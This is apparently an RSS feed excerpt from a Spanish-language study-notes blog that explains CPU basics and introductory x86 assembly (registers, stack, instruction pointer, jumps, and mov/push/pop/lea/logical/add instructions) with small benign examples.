 <br><br>Como hemos explicado en <a data-href="Operative Systems Basics#CPU Architecture" href="https://dobliuw.com/notes/3.-system/operative-systems/operative-systems-basics.html#CPU_Architecture" class="internal-link" target="_self" rel="noopener nofollow">Operative Systems Basics &gt; CPU Architecture</a>, la CPU (Central Processing Unit) es el componente primario de una computadora que se encarga y responsabiliza de ejecutar instrucciones, realizar calculos y manejar datos dentro de un sistema. Funciona como el cerebro de la computadora.<br><br>
<br>Registers:

<br>Localizaciones de almacenamiento pequeñas y rápidas dentro de la CPU.
<br>Utilizados para almacenar datos temporalmente durante la ejecución.
<br>Ejemplos: Registros de proposito general (EAX, EBX, ECX, EDX), Stack Pointer (ESP), Base Pointer (BSP).


<br>ALU (Arithmetic Logic Unit):

<br>Realiza operaciones lógicas y aritméticas.


<br>Control Unit:

<br>Gestiona la ejecución de instrucciones, dirigiendo el flujo de datos.


<br><br><br>La memoria almacena datos e instrucciones para uso inmediato por parte de la CPU. Tipos de memoria incluyen:<br>
<br>RAM (Random Access Memory): Volátil, utilizada para almacenamiento temporal durante ejecución.
<br>ROM (Read-Only Memory): No volátil, contiene instrucciones escenciales y datos que permanecen intactos incluso cuando el dispositivo está apagado.
<br>La memoria permite a la computadora acceder rápidamente y recuperar datos necesarios por procesos, facilitando operaciones y el multitasking.<br><br><br>El lenguaje ensamblador es un lenguaje de programación de bajo nivel que provee una representación simbólica de instrucciones máquina, como mover datos entre registros, realizar operaciones aritmeticas o controlar el flujo del programa. Ofrece un buen control sobre recursos del sistema y es utilizado para realizar tareas críticas.<br><br><br>Los registros son ubicaciones de almacenamiento pequeñas y de alta velocidad dentro de la CPU, que se utilizan para almacenar datos temporalmente durante la ejecución del programa. Son el tipo de memoria más rápido en un sistema infromático, capaces de almacenar y recuperar datos mucho más rápidamente que la memoria principal (RAM).<br>La CPU utiliza los registros para almacenar datos que se procesan activamente, incluyendo resultados intermedios de cálculos, direcciones de memoria e información de control. Son directamente accesibles mediante la CPU ALU y se utilizan para realizar operaciones aritméticas y lógicas, así como para controlar el flujo del programa.<br>Tipos de registros comúnes incluidos en una CPU incluyen:<br>
<br>
General-Purpose Registers: Los registros de propósito general en x86 se utilizan para diversas operaciones aritméticas, lógicas y de manipulación de datos. Estos registros son:

<br>EAX (AX, AL, AH): Acumulador principal utilizado en operaciones aritméticas y lógicas. EAX es el registro completo de 32 bits, AX es la mitad inferrior de 16 bits, y AL y AH son los bytes inferior y superior de AX, respectivamente.
<br>EBX (BX, BL, BH): Registro base utilizado en operaciones de índice y a veces en direccionamiento de memoria.
<br>ECX (CX, CL, CH): Contador utilizado en operaciones de bucles y cadenas.
<br>EDX (DX, DL, DH): Registro de datos utilizados en operaciones de multiplicación y división extendidas.
<br>ESI (SI): Índice de fuente utilizado en operaciones de manipulación de cadenas.
<br>EDI (DI): Índice de destino utilizado en operaciones de manipulación de cadenas.
<br>EBP (BP): Puntero base utilizado para referencia de pila.
<br>ESP (ESP): Puntero de pila que apunta a la parte superior de la pila.


<br>
Program counter (PC) Register / Instruction Pointer (IP): Este es el registro del puntero de instrucción que contiene la dirección de la próxima instrucción a ejecutar. En modo protected de 32 bits se llama EIP, y en modo large de 64 bits se llama RIP. 

<br>
Stack Pointer (SP) Register: El puntero de pila apunta a la ubicación actual en la pila (stack) y es utilizado par amanejar la misma durante sobroutine calls y returns. En modo de 32 bits se llama ESP y en modo de 64 bits se lama RSP. La pila se utiliza para almacenar datos temporales, direcciones de retorno y para pasar argumentos a las funciones.

<br>
Base Pointer (BP): El puntero base se utiliza para referencia de pila y a menudo se utiliza para acceder a parámetros y variables locales dentro de una función. En modo de 32 bits se llama EBP y en modo de 64 bits se llama RBP.

<br>Como vimos, los nombres de registros pueden cambiar su sintáxis según la arquitectura:<br><img alt="lowlevel_pointers_arquitecture.png" src="https://dobliuw.com/lib/media/lowlevel_pointers_arquitecture.png"><br><br><br>Las direcciones de memoria son identificadores númericos utilizados para localizar y acceder a datos almacenados en la memoria de la computadora. En un sistema informático, la memoria es organizada como una secuencia de bytes, cada uno con una dirección única. Estas direcciones sirven como referencias a ubicaciones específicas dentro del espacio de memoria.<br>Cuando un programa es ejecutado, los datos e instrucciones son cargados en memoria, y la CPU utiliza las direcciones de memoria para leer o escribir y ejecutar instrucciones. Por ejemplo, cuando una variable es declarada en un programa, es asiganada una dirección de memoria donde se encontrará el valor almacenado en esta. De manera similar, cuando se recupera una instrucción para su ejecución, su dirección de memoria correspondiente se utiliza para recuperar la instrucción de la memoria.<br>Las direcciones de memoria suelen estar representadas en hexadecimal y pueden tener un rango desde 0x00000000 a 0xFFFFFFFF (En un sistema de 32 bit) o incluso mayores en un sistema de 64 bits. El tamaño de la dirección de memoria determina la cantidad máxima de memoria que puede ser direccionada por el CPU, conocido como addressable memory space. <br>Para hacer esto un poco más visual, vamos a ejemplificarlo con la siguiente imagén:<br><img alt="memory_addressing_with_numbers_example.png" src="https://dobliuw.com/lib/media/memory_addressing_with_numbers_example.png"><br>Como se puede ver, cada número representa una dirección de memoria única la cual contiene una instrucción en lenguaje ensamblador.<br>Para entender como se vería el direccionamiento de este ejemplo en realidad, deberíamos desglozar el código en ensamblador:<br>push ebp
mov ebp, esp
sub esp, 0x10
mov [ebp-0x8], 0x1
Copy<br>Cada instrucción ensamblador se traduce a una secuencia de bytes en código máquina, que se almacenan en ubicaciones consecutivas en memoria. Vamos a asignar direcciones de memorias específicas a estas instrucciones y mostrar sus correspondientes representaciones en código máquina:<br>
<br>
push ebp: Esta instrucción trasladada a código máquina tendría el valor de 55 y la función equivaldría a guardar el valor actual del registro EBP en el stack. Esto se hace para preservar el valor del EBP antes de modificarlo.

<br>
mov ebp, esp: Esta instrucción trasladada a código máquina tendría el valor de 89 E5 y la función sería copiar el valor del registro ESP (Stack Pointer) al registro EBP, estableciendo el puntero base del nuevo marco de pila (stack frame) al valor actual de ESP. 

<br>
sub esp, 0x10: Esta instrucción trasladada a código máquina tendría el valor de 83 EC 10 y la función sería restar 16 (0x10 en hexadecimal) del registro ESP, reservando espacio en la pila para las variables locales, esto desplaza el puntero de pila (ESP) hacia abajo, creando espacio para las variables locales.

<br>
mov [ebp-0x8], 0x1: Esta instrucción final trasladada a código máquina tendría el valor de C7 45 F8 01 00 00 00 y su función sería mover el valor 1 a la dirección de memoria ebp-0x8, esta es una ubicación de memoria en el nuevo marco de pila (stack frame), al crear un stack frame, EBP actúa como una referencia estable desde la cual se pueden acceder las variables locales y los parámetros de la función.

<br><br>Hay reglas y convenciones definidas que explican cómo se traducen las instrucciones ensamblador a código máquina. Estas reglas se especifican en la documentación del conjunto de instrucciones de la CPU (ISA, Instruction Set Architecture), la traducción de código implica varios conceptos y componentes:<br>
<br>Opcode (Código de operación) : Especifica la operación a realizar.
<br>ModR/M Byte: Utilizado para especificar los operandos.
<br>SIB Byte: Si es necesario se utiliza para direccionamientos más complejos.
<br>En resumen, para entender el direccionamiento en memoria hay que entender el sistema hexadecimal (<a data-href="General Concepts#Hexadecimal System" href="https://dobliuw.com/General Concepts#Hexadecimal System" class="internal-link" target="_self" rel="noopener nofollow">General Concepts &gt; Hexadecimal System</a>) por lo que un real ejemplo de direcciones de memoria se vería tal que así:<br><img alt="real_addressing_example.png" src="https://dobliuw.com/lib/media/real_addressing_example.png"><br><br><br>La pila (The Stack) es una region de memoria utilizada por los programas para almacenar datos temporales y manejar los llamados de funciones. Opera en los principios LIFO (Last-In-First-Out), significando que el dato ingresado (pushed) más reciente al stack será el principal en dejar el mismo (popped off).<br>Cuando una función es llamada, frecuentemente sus variables y parámetros son almacenados en el stack, junto con la dirección de retorno, que apunta a la instrucción para renaudar la ejecución después de la llamada a la función. A medida que se llaman y retornan funciones, estos datos son pushed y popped off de la pila en consecuencia.<br>La pila frecuentemente esta posicionada en el final del espacio de dirección de memoria en un sistema informático. Esto significa que ocupa las direcciones de memoria más bajas, y las direcciones aumentan a medida que asciende el stack.<br>En un sistema con una pila que crece hacia abajo (downward-growing stack), como en arquitecturas x86, la pila comienza en la dirección de memoria más alta y crece hacia abajo a medida que se instroducen más datos en ella. Por el contrario, en sistemas que crecen hacia arriba (upward-growing stack), como algunas arquitecturas embebidas, el stack comienza en la dirección de memoria más baja y crece hacia arriba.<br>Independientemente de la dirección, la parte inferior de la pila es donde los nuevos datos son pushed, mientras que el tope de la pila es donde la data es popped off. Esta disposición permite que la pila administre eficientemente llamadas a funciones, variables locales y otros datos temporales dentro de un programa.<br>En el siguiente gráfico podrémos ver como se ve la pila:<br><img alt="stack_low_level_concepts_representation.png" src="https://dobliuw.com/lib/media/stack_low_level_concepts_representation.png" style="width: 600px; max-width: 100%;"><br>Como podemos ver, al final de el espacio de memoria que ocupe nuestro programa nos encontraremos con la pila, mientras que al principio del mismo podremos encontrar las instrucciones de nuestro programa.<br><br><br>Esta sección requiere de su propio articulo dado el contenido que presenta y se explica en esta. Por lo que antes de seguir con la siguiente sección (Instruction Pointer), se recomienda ir a dicho articulo y entender los conceptos explicados en este.<br><br><br>El Instruction Pointer (IP) contiene la dirección de memoria de la siguiente instrucción a ejecutar. Por ejemplo, el EIP apunta a la dirección de memoria 0x7FFFFFF4, lo que significa que la proxima instrucción a ejecutarse será mov eax, 0x10, la cual indica que se copiara el valor 0x10 dentro del registro EAX:<br><img alt="EIP_example_explanation_1.png" src="https://dobliuw.com/lib/media/eip_example_explanation_1.png"><br>Luego de ejecutar la ejecución alojada en la dirección de memoria 0x7FFFFFF4, EAX pasará a tener el valor de 0x10 y el registro EIP apuntará a la siguiente dirección, es decir 0x7FFFFFF5: <br><img alt="EIP_example_explanation_2.png" src="https://dobliuw.com/lib/media/eip_example_explanation_2.png"><br>Como podemos ver, el EIP a sido incrementado en una dirección y ahora apunta a la dirección 0x7FFFFFF5, en donde se alojá la instrucción de alojar el valor de 0x1 en EBX, una vez ejecutada esta instrucción, se volverá a incrementar en una dirección el valor de EIP: <br><img alt="EIP_example_explanation_3.png" src="https://dobliuw.com/lib/media/eip_example_explanation_3.png"><br>En la instrucción alojada en la dirección 0x7FFFFFF6, esta la operación sub eax, ebx, indacando que el valor almacenado en ebx será restado al valor almacenado en eax (eax - ebx) y se igualará eax a el resultado de esta operación, lo que dará resultado de 0xF: <br><img alt="EIP_example_explanation_4.png" src="https://dobliuw.com/lib/media/eip_example_explanation_4.png"><br>Finalmente, el EIP se volverá a incrementar pasando a apuntar a la dirección de memoria 0x7FFFFFF7 la cual contiene la instrucción aritmética add eax, 0x1, lo cual sumará el valor almacenado en EAX (0xF) en una unidad (0x1), lo que dará como resultado 0x10 y EAX pasará a valer eso.<br><br>El puntero de la pila (Stack Pointer) es un registro que almacena la dirección de memoria de la parte superior (Top) del stack. Indica la posición actual en la pila donde se insertan o extraen los datos durante la ejecución del programa.<br><img alt="stack_pointer_example_1.png" src="https://dobliuw.com/lib/media/stack_pointer_example_1.png"><br>Cada sección del stack ocupa 4 bytes, por lo que para mantener el SP alineado, será incrementado o decrementado en 4 bytes. Los números en hexadecimal pintados de rojo representan las direcciones de memoria correspondientes a las posiciones dentro del stack. Esto explica la diferencia de 4 bytes entre ellos. El SP no indica los valores almacenados dentro de estas secciones, si no sus direcciones.<br><img alt="stack_pointer_example_2.png" src="https://dobliuw.com/lib/media/stack_pointer_example_2.png"><br>En este ejemplo, el ESP (Stack Pointer) apunta a la dirección 0x14 dentro del stack. Esta sección almacena el valor 0x45454545, representando la string "EEEE". Fijemonos, que en lugar de referirnos a que el ESP es 0x45454545, ESP representa la dirección 0x14 que a su vez apunta al valor 0x45454545. <br>ESP --&gt; 0x14 --&gt; 0x45454545<br>Explicar esto puede ayudar a librarnos de confusiones tras visualizar que el ESP apunta a una sección del stack donde se almacena data, dado que como mencionamos, en realidad, el ESP apunta a la dirección de memoria que almacena esa data. <br><br><br>Para terminar de ascentar los conocimientos y el entendimiento del flujo de trabajo y funcionamiento de los conceptos previamente mencionados, vamos a citar un ejemplo gráfico sobre esto.<br>Como podemos observar en la imagen de abajo, tenemos el registro EIP apuntando a la siguiente instrucción a ejecutar, en este caso mov eax, 0x1234, instrucción que cargará el registro EAX con el valor de 0x1234, mientras que el Stack se encuentra en las direcciones de memoria más altas (En este ejemplo 0xFF) y el registro ESP apunta al stack.<br><img alt="stack_and_eip_example_full_1.png" src="https://dobliuw.com/lib/media/stack_and_eip_example_full_1.png"><br>Una vez ejecutada la instrucción mencionada, el registro EIP incrementa su valor apuntando a la siguiente instrucción la cual será push eax, instrucción que cargará en la pila el valor almacenado en el registro EAX, siendo 0x1234 (Valor almacenado por la instrucción anterior de nuestro programa). <br><img alt="stack_and_eip_example_full_2.png" src="https://dobliuw.com/lib/media/stack_and_eip_example_full_2.png"><br>La instrucción push eax decrementará el valor de la pila en 4 bytes, podríamos entender mejor esto traduciendo esta instrucción a dos instrucciones, por un lado sub esp, 0x4, instrucción que decrementará 4 bytes del registro ESP (Stack Pointer) y por otro lado en la instrucción mov [esp], eax, instrucción que moverá el valor almacenado en EAX dentro de la localización apuntada por el ESP.<br>Como se puede ver en la imagen de abajo, una vez ejecutada la instrucción push eax, el valor almacenado en este registro (0x1234) será enviado al stack, donde el ESP será decrementado y apuntará a la dirección de memoria del comienzo del stack, donde estará nuestro valor 0x1234.<br><img alt="stack_and_eip_example_full_3.png" src="https://dobliuw.com/lib/media/stack_and_eip_example_full_3.png"><br>A su vez, el EIP nuevamente incrementará su valor apuntando a la dirección en memoria que almacena la siguiente instrucción (pop ebx), instrucción que incrementará el valor de la pila en 4 bytes y almacenará el valor hayado en la dirección de memoria de la pila para trasladarlo al registro EBX.<br>Nuevamente podríamos traducir la instrucción pop ebx en dos instrucciones, por un lado mov ebx, [esp] la cual moverá el valor almacenado en la dirección de memoria del registro ESP al registro EBX, y por otro lado la instrucción add esp, 0x4 la cual incrementará el valor del stack, es decir, del registro ESP en 4 bytes.<br><img alt="stack_and_eip_example_full_4.png" src="https://dobliuw.com/lib/media/stack_and_eip_example_full_4.png"><br><br><br>Para manipular el flujo del programa, el lenguaje ensamblador provee instrucciones jump, comunmente conocidas como GOTOs. Estas instrucciones trabajan para modificar el Instruction Pointer (IP o EIP) cuando son ejecutadas. Hay dos tipos principales de instrucciones jump: unconditional jumps y conditional jumps.<br><br>Un unconditional jump, a veces referenciado simplemente como jump, modifica el EIP para apuntar directamente a una dirección de memoria. Cuando se ejecuta, el flujo de control se transfiere a la dirección de memoria especificada sin ninguna condición.<br>Por ejemplo a raíz de la siguiente instrucción (jmp 0x03) se llevará a cabo un salto a la dirección en memoria 0x03::<br><img alt="unconditional_jumps_examples_1.png" src="https://dobliuw.com/lib/media/unconditional_jumps_examples_1.png" style="width: 500px; max-width: 100%;"> <img alt="unconditional_jumps_examples_2.png" src="https://dobliuw.com/lib/media/unconditional_jumps_examples_2.png" style="width: 535px; max-width: 100%;"><br><br>Un conditional jump o conditional branch modifica el EIP para qeu apunte directamente a la dirección especificada según el estado de ciertos indicadores. Por ejemplo, la instrucción jne (jump if not equal) salta a la dirección espeificada solo si ZeroFlag (ZF) es 0, lo que indica que la operación aritmética anterior no resultó en cero.<br>Por ejemplo, en la siguiente imagen entendemos que seteamos el registro EAX en 10 y el registro EBX en 5, posteriormente comparamos estos registros. Dado que 5 y 10 no son iguales, cuando el registro EIP apunte a la instrucción jne 0x01, dado que ZeroFlag es 0, el programa saltará a la dirección en memoria específicada, en este caso 0x01:<br><img alt="conditional_jumps_examples_1.png" src="https://dobliuw.com/lib/media/conditional_jumps_examples_1.png" style="width: 500px; max-width: 100%;"> <img alt="conditional_jumps_examples_2.png" src="https://dobliuw.com/lib/media/conditional_jumps_examples_2.png" style="width: 500px; max-width: 100%;"><br>Si no se cumple la condición especificada por la instrucción jne, lo que significa que los registros que se compararon son iguales, entonces el flujo del programa no saltará a la dirección de destino especificada por la instrucción. En cambio, el puntero de instrucción simplemente pasará a la siguiente instrucción en secuencia. En este ejemplo, en caso de que no se hubiera cumplido la condición simplemente EIP apuntaría a 0x07 en lugar de saltar a 0x01, es decir que en este caso la instrucción jne 0x01 pasaría a simular un nop (No operation). ]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/low-level-concepts/assemblly-&amp;-cpu-fundamentals/0.-cpu-&amp;-assembly-basics.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Low-Level Concepts/Assemblly &amp; CPU Fundamentals/0. CPU &amp; Assembly Basics.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 11 Jul 2024 23:45:07 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/lowlevel_pointers_arquitecture.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/lowlevel_pointers_arquitecture.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Assembly]]></title><description><![CDATA[ 
 <br><br>El lenguaje ensamblador (Assembly language) es un lenguaje de programación de bajo nivel que está muy cerca del lenguaje máquina, el cual es comprendido directamente por la CPU. A diferencia de los lenguajes de alto nivel como C o Python, el ensamblador proporciona control directo sobre el hardware y es específico para cada arquitectura de CPU.<br>Sus componentes principales se dividen en:<br>
<br>Registers: Pequeñas unidades de almacenamiento dentro de la CPU utilizadas para realizar operaciones. Ejemplos de registros en la arquitectura x86 son EAX, EBX, ECX y EDX. Explicación de que son los registros y el uso de estos en <a data-href="0. CPU &amp; Assembly Basics#Registers" href="https://dobliuw.com/notes/3.-system/global-concepts/low-level-concepts/assemblly-&amp;-cpu-fundamentals/0.-cpu-&amp;-assembly-basics.html#Registers" class="internal-link" target="_self" rel="noopener nofollow">0. CPU &amp; Assembly Basics &gt; Registers</a>. 
<br>Instructions: Comandos que le dicen a la CPU qué operaciones realizar. Las instrucciones pueden ser de varios tipos, incluyendo aritméticas, de movimiento de datos, de control de flujo, entre otras.
<br>Directives: Las directivas son comandos que proporcionan información al ensamblador pero no se traducen directamente a instrucciones de máquina. Ejemplos incliyen .data para definiciar una sección de datos y .text para definir una sección de código.
<br>Labels: Las etiquetas son identificadores que se utilizan para marcar posiciones en el código, permitiendo saltos y llamadas a funciones.
<br><br><br>El ciclo de vida de un programa codeado en lenguaje ensamblador se separa en algunos puntos claves: <br>
<br>
Source Code<br>
El código fuente es el programa escrito por el programador en un lenguaje de alto nivel (C, C++, Python, etc.) o en ensamblador. Este es el punto de partida.

<br>
Assembly<br>
Continuamos con el ensamblado, momento en el que si el código fuente está en ensamblador, se utiliza un ensamblador (Como as en GNU) para convertir el código en lenguaje máquina. Este proceso genera un archivo objeto (.o).

<br>as -o program.o program.s
Copy<br>
<br>
Machine language<br>
El lenguaje máquian es el conjunto de instrucciones que la CPU puede ejecutar directamente. Estas instrucciones están codificadas en binario y son específicas para cada arquitectura de la CPU. El lenguaje máquina es el nivel más bajo de abstracción y consiste en secuencias de bits que representan operaciones y datos. Ejemplo: 10110000 01100001

<br>
Object language<br>
El térmi "lenguaje objeto" generalmente se refiere al código objeto o archivos objeto (.o). Los archivos objeto son el resultado del ensamblado del código fuente (En ensamblado o en un lenaguaje de alto nivel) y contiene código máquina, pero también incluyen metadatos adicionales necesarios para la vinculación, como símbolos y tables de reubicación.

<br>
<br>Compilation<br>
Para lenguajes de alto nivel, se usa un compilador (Como gcc para C) que realiza dos tareas:
<br>
<br>Traducción a Ensamblador: Convierte el código fuente a código ensamblador.
<br>Ensamblado Automático: Convierte el código ensamblador a código objeto.
<br>gcc -c program.c -o program.o
Copy<br>La flag -c indica que solo se quiere compilar y ensamblar, no enlazar. <br>
<br>Linking<br>
El proceso final, la vinculación o el enlace, toma uno o más archivos objeto y los combina en un único ejecutable, se utiliza un enlazador (ld en GNU) el cual resuelve las referencias a funciones y variables externas.
<br>ld -o final_executable program.o
gcc program.o -o final_executable
Copy<br><br><br>Como mencionamos anteriormente las Assembly Instructions son comandos que le indican a la CPU qué operaciones realizar. Las instrucciones pueden ser de varios tipos, incluyendo aritméticas, de movimiento de datos, de control de flujo, entre otras.<br>De igual manera, resulta fundamental entender que son los registros y direcciones de memoria, conceptos claves utilizados en esta sección explicados en <a data-href="0. CPU &amp; Assembly Basics" href="https://dobliuw.com/notes/3.-system/global-concepts/low-level-concepts/assemblly-&amp;-cpu-fundamentals/0.-cpu-&amp;-assembly-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. CPU &amp; Assembly Basics</a>. <br>Para resumir y tener en cuenta:<br>
<br>Registers: Los registros son ubicaciones de almacenamiento rápido dentro de la CPU. Ejemplos de registros en x86 son eax, ebx, ecx, esi, edi, ebp, esp etc.
<br>Memory Addresses: Las direcciones de memoria se especifican usando corchetes ([]). Pueden ser direcciones absolutas o relativas a otros registros.
<br>Constants: Las constantes son valores inmediatos que se especifican directamente en la instrucción.
<br>Operand Size: Es importante que los tamaños de los operandos coincidan. Por ejemplo, no podremos mover un valor de 32 bits a un registro de 16 bits sin convertir el tamaño adecuadamente.
<br>Efective Directions: Las instrucciones de movimiento que involucran memoria pueden usar una dirección efectiva que incluye desplazamientos y registros base/índice. Ejemplo:
<br>mov eax, [ebx + ecx*4 + 8]
Copy<br><br>Las instrucciones de movimiento de datos permiten transferir datos entre registros, memoria y constantes. Estas instrucciones son fundamentales para la manipulación de datos y el control de flujo en programas de bajo nivel. <br>
<br>


<br>La instrucción mov (Move) es fundamental en el lenguaje ensamblador, utilizada ara mover datos entre registros, entre registros y memoria, o entre un registro y un valor inmediato. Si bien los movimientos de registro a registro son factibles, no se admiten movimientos directos de memoria a memoria, dado que cuando son necesaria transferencias de memoria, el contenido de la memoria de origen debe cargarse incialmente en un registro, que luego puede almacenarse en la dirección de la memoria de destino.<br>Syntax<br>mov {destination}, {source}
Copy<br>Examples<br>mov ebx, eax      ; mov {reg}, {reg}     ; move the value stored in a register to another
mov eax, [ebx]    ; mov {reg}, {mem}     ; move the value of a memory address to a register
mov [var], eax    ; mov {mem}, {reg}     ; move the value of a register to a memory address
mov eax, 5        ; mov {reg}, {const}   ; move a constant to a register
mov [var2], 10    ; mov {mem}, {const}   ; move a constant to a memory address
Copy<br>En los ejemplos brindados arriba, se pueden apreciar todos los tipos de operaciones que se pueden realizar con la instrucción mov, dandonos la capacidad de mover registros con registros, registros con direcciones de memoria, direcciones de memoria con registros, registros con constantes y direcciones de memoria con constantes. <br>Es importante tener en cuenta que los movimiento de dirección de memoria con dirección de memoria no estan soportados.<br>
<br>


<br>La instrucción push se utiliza para colocar su operando en la parte superior de la pila (stack) en memoria. Como hemos mencionado, la pila es una estructura de datos qeu funciona en modo LIFO (Last In, First Out). En la arquitectura x86, la pila crece hacia direcciones de memoria más bajas.<br>
<br>ESP Decrement: ESP es el registro del punter de la pila (Stack Pointer). antes de colocar el operando en la pila, ESP se decrementa por 4, ya que en la arquitectura x86 el tamaño de una palabra es de 4 bytes (32 bits). Esto es necesario porque la pila en x86 crece hacia abajo, lo que signiffica que las nuevas entradas se colocan en direcciones de memoria más bajas.
<br>Operand Colocation: Despúes de decrementar ESP, el operando se coloca en la dirección de memoria apuntada por ESP.
<br>Syntax<br>push {source}
Copy<br>Examples<br>push eax      ; push {reg32}      ; push the value stored in eax to the stack
push [var]    ; push {mem}        ; push the value of a memory address to the stack
push 0x10     ; push {const32b}   ; push a constant of 32 bits to the stack
Copy<br>En el contexto de la arquitectura x86, una ubicación de 32 bits se refiere a una dirección de memoria que puede contener 32 bits (4 bytes) de datos. Las operaciones que involucran registros, direcciones de memoria y constantes suelen trabajar con bloques de datos de 32 bits. <br>Los registros de 32 bits en la arquitectura x86 son eax, ebx, ecx, edx, esi, edi, ebp y esp. Por otro lado también se podría envíar un valor inmediato que ocupa 32 bits, ejemplo 0x12345678.<br>Los siguientes gráficos intentan ayudarnos a entender de una manera más gráfica el desplazamiento de la pila (Stack) y del ESP (Stack Pointer), dado que como mencionamos, la pila a medida de que se envía (push) datos, se decrementa 4 bytes (32 bits) y el ESP cambia su valor a la dirección de la pila decrementada.<br>Ejemplo:<br>
<br>ESP (Stack Pointer) apunta a la dirección de memoria 0x7FFFFFFF:
<br><img alt="push_instruction_low_level_example_1.png" src="https://dobliuw.com/lib/media/push_instruction_low_level_example_1.png"><br>
<br>Nuestro programa ejecuta la instrucción push eax, donde eax almacena el valor de 0x12345678, lo que dará como resultado el decremento en 4 bytes de la pila y por ende del valor del ESP, pasando de valer 0x7FFFFFFF a valer 0x7FFFFFFB:
<br><img alt="0. Images/push_instruction_low_level_example_2.png" src="https://dobliuw.com/lib/media/push_instruction_low_level_example_2.png"><br>
<br>Nuestro programa ejecuta la instrucción push [0x2000], donde la dirección de memoria 0x00002000 almacena el valor 0x87654321, lo que dará como resultado el decremento en 4 bytes de la pila y por ende del valor del ESP, pasando de valer 0x7FFFFFFB a valer 0x7FFFFFF7:
<br><img alt="push_instruction_low_level_example_3.png" src="https://dobliuw.com/lib/media/push_instruction_low_level_example_3.png"><br>
<br>Nuestro programa ejecuta la instrucción push 0x30, lo que dará  como resultado el decremente en 4 bytes de la pila y por ende del valor del ESP, pasando de valer 0x7FFFFFF7 a valer 0x7FFFFFF3:
<br><img alt="push_instruction_low_level_example_4.png" src="https://dobliuw.com/lib/media/push_instruction_low_level_example_4.png"><br>Con este ejemplo podemos entender cómo el stack se expande desde la dirección inicial hacia direcciones menores con cada operación push y como el valor del ESP va mutando apuntando a la dirección de memoria del inicio de la pila.  <br>
<br>


<br>La instrucción pop se utiliza para eliminar un valor de la parte superior de la pila y almacenar ese valor en un registro o en una ubicación de memoria. El proceso implica dos pasos principales: <br>
<br>Operand Storage: Alamacenar el valor hayado en la dirección de memoria apuntada por ESP. 
<br>ESP Increment: Incrementear en 4 bytes (32 bits) el valor de ESP. 
<br>Syntax<br>pop {destination}
Copy<br>Examples<br>pop eax      ; pop {reg32}    ; pop off the last pushed value at the stack to a register
pop [var]    ; pop {mem}      ; pop off the last pushed value at the stack to a memory address
Copy<br>Los siguientes gráficos intentan ayudarnos a entender de una manera más gráfica el desplazamiento de la pila (Stack) y del ESP (Stack Pointer), dado que como mencionamos, la pila a medida de que se sacan (pop) datos, se incrementa 4 bytes (32 bits) y el ESP cambia su valor a la dirección de la pila incrementada. <br>
<br>ESP (Stack Pointer) apunta a la dirección de memoria 0x7FFFFFF3:
<br><img alt="pop_instruction_low_level_example_1.png" src="https://dobliuw.com/lib/media/pop_instruction_low_level_example_1.png"><br>
<br>Nuestro programa ejecuta la instrucción pop ebx, donde enebx se almacenará el último valor envíado (push) a la pila, lo que dará como resultado el incremento en 4 bytes de la pila y por ende del valor del ESP, pasando de valer  0x7FFFFFF3 a valer 0x7FFFFFF7:
<br><img alt="pop_instruction_low_level_example_2.png" src="https://dobliuw.com/lib/media/pop_instruction_low_level_example_2.png"><br>
<br>Nuestro programa ejecuta la instrucción pop ecx, donde en ecx se almacenará el último valor envíado (push) a la pila (0x87654321), lo que dará como resultado el incremento en 4 bytes de la pila y por ende del valor de ESP, pasando de valer 0x7FFFFFF7 a valer 0x7FFFFFFB:
<br><img alt="pop_instruction_low_level_example_3.png" src="https://dobliuw.com/lib/media/pop_instruction_low_level_example_3.png"><br>
<br>Por último, nuestro programa ejecuta la instrucción pop edx, donde en edx se almacenará el último valor envíad (push) a la pila (0x12345678), lo que dará como resultado el incremento en 4 bytes de la pila y por ende del valro de ESP, pasando de valer 0x7FFFFFFB a valer 0x7FFFFFFF:
<br><img alt="pop_instruction_low_level_example_4.png" src="https://dobliuw.com/lib/media/pop_instruction_low_level_example_4.png"><br>Con este ejemplo podemos entender cómo el stack se achica desde la dirección inicial hacia direcciones mayores con cada operación pop y como el valor del ESP va mutando apuntando a la dirección de memoria del inicio de la pila.  <br>
<br>


<br>La instrucción lea (Load effective Address) se utiliza para calcular la dirección efectiva de un operando y cargar esa direcció nen un registro. No mueve datos reales desde la memoria,sino que carga la dirección calculada de un operando en el registro de destino. <br>Cuando nos referimos a dirección efectiva (Effective address) es la dirección de memoria resultante del cálculo de un operando de memoria en una instrucción de ensamblador. En otras palabras, es la dirección que se obtiene después de evaluar cualquier expresión de direccionamiento que pueda estar presente en la instrucción. Esta dirección puede involucrar registros, desplazamientos y escalas, y se utiliza para acceder a los datos en la memoria.<br>Ejemplo:<br>[esi + 10]
Copy<br>Si esi tiene el valor de 0x1000, la dirección efectiva será 0x100A.<br>Syntax<br>lea {reg32}, {mem}
Copy<br>Examples<br>lea ecx, [eax + ebx*2]    ; Place the result of eax + ebx*2 into ecx
lea edi, [ebx + 4]        ; Place the result of ebx val + 4 into edi 
Copy<br><br>Las instrucciones lógicas en ensamblador se utilizan para realizar operaciones bit a bit en los operandos. Las más comunes incluyen AND, OR, XOR y NOT.<br>
<br>


<br>La operación and realiza una operación de tipo AND bit a bit entre dos operandos.<br>Syntax<br>and {destination}, {source}
Copy<br>Examples<br>and eax, ebx        ; eax = eax AND ebx
Copy<br>
<br>


<br>La operación or realiza una operación de tipo OR bit a bit entre dos operandos.<br>Syntax<br>or {destination}, {source}
Copy<br>Examples<br>or eax, ebx        ; eax = eax OR ebx
Copy<br>
<br>


<br>La operación xor realiza una operación XOR bit a bit entre dos operandos.<br>Syntax<br>xor {destination}, {source}
Copy<br>Examples<br>xor eax, ebx       ; eax = eax XOR ebx
Copy<br>
<br>


<br>La operación not realiza una operación NOT bit a bit entre dos operandos.<br>Syntax<br>not {operand}
Copy<br>Examples<br>not eax            ; eax = NOT eax
Copy<br><br>Las instrucciones aritméticas en ensamblador se utilizan para realizar operaciones matemáticas básicas como suma, resta multiplicación y división.<br>
<br>


<br>La instrucción add (Addition) suma dos operandos y almacena el resultado en el operador de destino. <br>Syntax<br>add {destination}, {source}
Copy<br>Examples<br>add eax, ebx         ; eax = eax + ebx
Copy<br>
<br>


